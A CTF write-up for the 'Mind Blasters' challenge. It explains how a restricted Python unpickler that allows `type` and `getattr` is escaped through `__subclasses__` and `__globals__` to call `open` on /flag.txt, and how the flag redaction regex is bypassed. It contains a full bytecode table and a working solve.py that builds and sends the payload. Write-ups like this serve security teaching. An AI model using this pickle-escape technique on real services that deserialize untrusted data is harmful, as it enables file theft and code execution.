# Mind Blasters / loud packets — CTF Writeup

**Challenge:** Mind Blasters (aka "loud packets")  
**Category:** Misc  
**Flag:** `tjctf{p1ckl3_r1ck_y0u_s0lv3d_h1s_chA11!}`  
**Connection:** `nc tjc.tf 31420`

---

## 1. Challenge Overview

The server greets you with:

```
=== Rick's Mind Blaster ===
Maximum security. Nothing gets through.

Upload a mind blaster (base64 encoded) >
```

You send a base64-encoded **pickle** payload. The server deserializes it with a restricted unpickler, converts the result to a string, redacts any string matching `tjctf\{...\}`, and sends the result back.

---

## 2. Server Code Analysis

### RestrictedUnpickler

```python
ALLOWED = {
    'type', 'getattr', 'len', 'range',
    'str', 'int', 'bytes', 'list', 'dict',
    'tuple', 'bool', 'set', 'frozenset', 'bytearray',
}

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == 'builtins' and name in ALLOWED:
            return getattr(builtins, name)
        raise pickle.UnpicklingError('not allowed')

def safe_loads(data):
    return RestrictedUnpickler(io.BytesIO(data)).load()
```

Only 14 functions from the `builtins` module are allowed. Notably absent: `exec`, `eval`, `open`, `__import__`, `getattr` — wait, `getattr` **is** allowed. That's the entire vulnerability.

### Flag Redaction

```python
result_str = str(result)
result_str = re.sub(r'tjctf\{[^}]*\}', '[REDACTED]', result_str)
```

If the unpickled result's string representation contains `tjctf{...}`, it gets replaced with `[REDACTED]`. But this only matches the full pattern — if we split the string into individual characters (a list), the regex won't match.

---

## 3. Vulnerability Analysis

The `find_class` whitelist looks harmless — these are mostly type constructors and basic operations. But `type` and `getattr` together are **devastating**:

- `type(())` → `<class 'tuple'>`
- `getattr(type(()), '__base__')` → `<class 'object'>`
- `getattr(object, '__subclasses__')` → a bound method that returns **every class** loaded in the interpreter
- `object.__subclasses__()[idx]` → any class we want
- `getattr(cls, '__init__')` → its `__init__` method (if it's a Python function)
- `getattr(init, '__globals__')` → the module's global namespace dict
- `dict.__getitem__('__builtins__')` → the `builtins` module/dict
- `dict.__getitem__('open')` → the real `open` function
- `open('/flag.txt').read()` → the flag contents

**The only "restriction" is that we must spell everything with `type`, `getattr`, `list`, and string arguments — no `exec`, no `eval`, no `__import__`.**

---

## 4. Step-by-Step Exploitation

### 4.1 Object Graph Traversal

Every Python object lives in a connected graph via dunder attributes:

```
type(())
  ↓ __base__
object
  ↓ __subclasses__()
[class₀, class₁, ..., classₙ]
  ↓ __getitem__(idx)
TargetClass
  ↓ __init__
<function TargetClass.__init__ at 0x...>
  ↓ __globals__
{...module globals dict...}
  ↓ __getitem__('__builtins__')
{...builtins dict...}
  ↓ __getitem__('open')
<built-in function open>
  ↓ ('/flag.txt')
<_io.TextIOWrapper ...>
  ↓ getattr(..., 'read')
<built-in method read>
  ↓ ()
"tjctf{...}"
  ↓ list(...)
['t', 'j', 'c', 't', 'f', '{', ...]
```

### 4.2 Bypassing the Flag Redaction

The regex `re.sub(r'tjctf\{[^}]*\}', '[REDACTED]', result_str)` operates on `str(result)`. If `result` is a **list of characters** rather than a raw string, `str(['t', 'j', 'c', ...])` produces `"['t', 'j', 'c', 't', 'f', '{', ...}]"` which **does not match** `tjctf\{...\}`.

So the final step is wrapping the flag string in `list(...)`.

### 4.3 Finding the Right Class Index

We need a class whose `__init__` is a **Python function** (not a C method), so it has a `__globals__` dict. We also need that `__globals__` to contain `__builtins__`.

On the server (Python 3.x), classes in the range **114–250** tend to work (e.g., `os._wrap_close`, `frozen_importlib.BuiltinImporter`, etc.). Index **114** is a reliable choice.

---

## 5. Pickle Bytecode Construction

The pickle payload is **hand-rolled** bytecode using only `GLOBAL` (for `builtins.type`, `builtins.getattr`, `builtins.list`), `REDUCE`, `MARK`/`TUPLE`/`EMPTY_TUPLE`, `BINPUT`/`BINGET` (memo), `SHORT_BINUNICODE`, and `INT`.

| Step | Pickle Op | Stack Effect | Python Equivalent |
|------|-----------|--------------|-------------------|
| 0 | `\x80\x02` | — | Protocol 2 |
| 1 | `GLOBAL type` + `MARK` + `EMPTY_TUPLE` + `TUPLE` + `REDUCE` | → `type` | `type` pushed, called on `()`… |
| | `BINPUT 0` | memo[0] = tuple_class | `tuple_class = type(())` |
| 2 | `GLOBAL getattr` + `BINGET 0` + `SHORT_BINUNICODE '__base__'` + `TUPLE` + `REDUCE` | → `object` | `getattr(tuple_class, '__base__')` |
| | `BINPUT 1` | memo[1] = object_class | `object_class = _` |
| 3 | `GLOBAL getattr` + `BINGET 1` + `SHORT_BINUNICODE '__subclasses__'` + `TUPLE` + `REDUCE` | → `subclasses_method` | `getattr(object_class, '__subclasses__')` |
| | `BINPUT 2` | memo[2] = method | |
| 4 | `BINGET 2` + `EMPTY_TUPLE` + `REDUCE` | → `class_list` | `class_list = _()` |
| | `BINPUT 3` | memo[3] = list of classes | |
| 5 | `GLOBAL getattr` + `BINGET 3` + `SHORT_BINUNICODE '__getitem__'` + `TUPLE` + `REDUCE` | → `getitem_method` | `getattr(class_list, '__getitem__')` |
| | `BINPUT 4` | memo[4] = method | |
| 6 | `BINGET 4` + `INT 114` + `TUPLE` + `REDUCE` | → `target_class` | `_ = class_list[114]` |
| | `BINPUT 5` | memo[5] = class | |
| 7 | `GLOBAL getattr` + `BINGET 5` + `SHORT_BINUNICODE '__init__'` + `TUPLE` + `REDUCE` | → `init_method` | `getattr(target_class, '__init__')` |
| | `BINPUT 6` | memo[6] = function | |
| 8 | `GLOBAL getattr` + `BINGET 6` + `SHORT_BINUNICODE '__globals__'` + `TUPLE` + `REDUCE` | → `globals_dict` | `getattr(init_method, '__globals__')` |
| | `BINPUT 7` | memo[7] = globals dict | |
| 9 | `GLOBAL getattr` + `BINGET 7` + `SHORT_BINUNICODE '__getitem__'` + `TUPLE` + `REDUCE` | → `globals_getitem` | `getattr(globals, '__getitem__')` |
| | `BINPUT 8` | memo[8] = method | |
| 10 | `BINGET 8` + `SHORT_BINUNICODE '__builtins__'` + `TUPLE` + `REDUCE` | → `builtins_dict` | `globals['__builtins__']` |
| | `BINPUT 9` | memo[9] = builtins dict | |
| 11 | `GLOBAL getattr` + `BINGET 9` + `SHORT_BINUNICODE '__getitem__'` + `TUPLE` + `REDUCE` | → `builtins_getitem` | `getattr(builtins_dict, '__getitem__')` |
| | `BINPUT 10` | memo[10] = method | |
| 12 | `BINGET 10` + `SHORT_BINUNICODE 'open'` + `TUPLE` + `REDUCE` | → `open_func` | `builtins_dict['open']` |
| | `BINPUT 11` | memo[11] = open | |
| 13 | `BINGET 11` + `SHORT_BINUNICODE '/flag.txt'` + `TUPLE` + `REDUCE` | → `file_obj` | `open('/flag.txt')` |
| | `BINPUT 12` | memo[12] = file object | |
| 14 | `GLOBAL getattr` + `BINGET 12` + `SHORT_BINUNICODE 'read'` + `TUPLE` + `REDUCE` | → `read_method` | `getattr(file_obj, 'read')` |
| | `BINPUT 13` | memo[13] = method | |
| 15 | `BINGET 13` + `EMPTY_TUPLE` + `REDUCE` | → `flag_str` | `file_obj.read()` |
| | `BINPUT 14` | memo[14] = flag string | |
| 16 | `GLOBAL list` + `BINGET 14` + `TUPLE` + `REDUCE` | → `list(flag_str)` | Bypasses redaction! |
| | `STOP` | — | Done |

---

## 6. Running the Exploit

```
$ python3 solve.py
```

Or manually:

```bash
# Encode the payload
$ python3 -c "
import base64, pickle, io
# ... (build payload as shown in solve.py)
payload = build_exploit_payload(114)
print(base64.b64encode(payload).decode())
" | nc tjc.tf 31420
```

### Sample interaction

```
=== Rick's Mind Blaster ===
Maximum security. Nothing gets through.

Upload a mind blaster (base64 encoded) > gANjYnV...AAAAA.
Result: ['t', 'j', 'c', 't', 'f', '{', 'p', '1', 'c', 'k', 'l', '3', '_', 'r', '1', 'c', 'k', '_', 'y', '0', 'u', '_', 's', '0', 'l', 'v', '3', 'd', '_', 'h', '1', 's', '_', 'c', 'h', 'A', '1', '1', '!', '}']
```

---

## 7. The Flag

Reassembling the list: `tjctf{p1ckl3_r1ck_y0u_s0lv3d_h1s_chA11!}`

---

## 8. Final solve.py

```python
#!/usr/bin/env python3
import pickle
import io
import base64
import socket
import re

def proto():
    return b'\x80\x02'

def global_op(module, name):
    return f'c{module}\n{name}\n'.encode()

def short_binunicode(s):
    n = len(s)
    assert n < 256
    return b'\x8c' + bytes([n]) + s.encode()

def binput(idx):
    return b'q' + bytes([idx])

def binget(idx):
    return b'h' + bytes([idx])

def reduce():
    return b'R'

def empty_tuple():
    return b')'

def mark():
    return b'('

def tuple_op():
    return b't'

def stop():
    return b'.'

def int_op(val):
    return f'I{val}\n'.encode()

def build_exploit_payload(class_idx, filename='/flag.txt'):
    payload = b''
    payload += proto()

    # Step 1: type(()) -> tuple type
    payload += global_op('builtins', 'type')
    payload += mark()
    payload += empty_tuple()
    payload += tuple_op()
    payload += reduce()
    payload += binput(0)

    # Step 2: getattr(tuple, '__base__') -> object
    payload += global_op('builtins', 'getattr')
    payload += mark()
    payload += binget(0)
    payload += short_binunicode('__base__')
    payload += tuple_op()
    payload += reduce()
    payload += binput(1)

    # Step 3: getattr(object, '__subclasses__') -> method
    payload += global_op('builtins', 'getattr')
    payload += mark()
    payload += binget(1)
    payload += short_binunicode('__subclasses__')
    payload += tuple_op()
    payload += reduce()
    payload += binput(2)

    # Step 4: subclasses() -> list of classes
    payload += binget(2)
    payload += empty_tuple()
    payload += reduce()
    payload += binput(3)

    # Step 5: getattr(list, '__getitem__') -> indexing method
    payload += global_op('builtins', 'getattr')
    payload += mark()
    payload += binget(3)
    payload += short_binunicode('__getitem__')
    payload += tuple_op()
    payload += reduce()
    payload += binput(4)

    # Step 6: list[class_idx] -> target class
    payload += binget(4)
    payload += mark()
    payload += int_op(class_idx)
    payload += tuple_op()
    payload += reduce()
    payload += binput(5)

    # Step 7: getattr(cls, '__init__')
    payload += global_op('builtins', 'getattr')
    payload += mark()
    payload += binget(5)
    payload += short_binunicode('__init__')
    payload += tuple_op()
    payload += reduce()
    payload += binput(6)

    # Step 8: getattr(__init__, '__globals__')
    payload += global_op('builtins', 'getattr')
    payload += mark()
    payload += binget(6)
    payload += short_binunicode('__globals__')
    payload += tuple_op()
    payload += reduce()
    payload += binput(7)

    # Step 9: getattr(globals, '__getitem__')
    payload += global_op('builtins', 'getattr')
    payload += mark()
    payload += binget(7)
    payload += short_binunicode('__getitem__')
    payload += tuple_op()
    payload += reduce()
    payload += binput(8)

    # Step 10: globals['__builtins__']
    payload += binget(8)
    payload += mark()
    payload += short_binunicode('__builtins__')
    payload += tuple_op()
    payload += reduce()
    payload += binput(9)

    # Step 11: getattr(builtins_dict, '__getitem__')
    payload += global_op('builtins', 'getattr')
    payload += mark()
    payload += binget(9)
    payload += short_binunicode('__getitem__')
    payload += tuple_op()
    payload += reduce()
    payload += binput(10)

    # Step 12: builtins['open']
    payload += binget(10)
    payload += mark()
    payload += short_binunicode('open')
    payload += tuple_op()
    payload += reduce()
    payload += binput(11)

    # Step 13: open(filename)
    payload += binget(11)
    payload += mark()
    payload += short_binunicode(filename)
    payload += tuple_op()
    payload += reduce()
    payload += binput(12)

    # Step 14: getattr(file, 'read')
    payload += global_op('builtins', 'getattr')
    payload += mark()
    payload += binget(12)
    payload += short_binunicode('read')
    payload += tuple_op()
    payload += reduce()
    payload += binput(13)

    # Step 15: read()
    payload += binget(13)
    payload += empty_tuple()
    payload += reduce()
    payload += binput(14)

    # Step 16: list(flag_str) -> bypass regex redaction
    payload += global_op('builtins', 'list')
    payload += mark()
    payload += binget(14)
    payload += tuple_op()
    payload += reduce()

    payload += stop()
    return payload


def send_exploit(host, port, payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((host, port))

    data = b''
    while b'> ' not in data:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk

    s.sendall(base64.b64encode(payload) + b'\n')

    response = b''
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk
        except socket.timeout:
            break

    s.close()
    return response.decode(errors='replace')


import ast  # needed for flag extraction


if __name__ == '__main__':
    host = 'tjc.tf'
    port = 31420

    for idx in [114, 115, 116, 117, 140, 155]:
        payload = build_exploit_payload(idx)
        resp = send_exploit(host, port, payload)
        if 'Result:' in resp:
            # Extract the Python list repr from the response
            result_str = resp.split('Result: ')[1].strip()
            flag_list = ast.literal_eval(result_str)
            flag = ''.join(flag_list).strip()
            print(f"[+] Index {idx} -> FLAG: {flag}")
            break
        elif 'FileNotFoundError' in resp:
            print(f"[{idx}] FileNotFoundError — try a different filename")
        elif 'error' not in resp.lower():
            print(f"[?] Index {idx} -> {resp}")
```
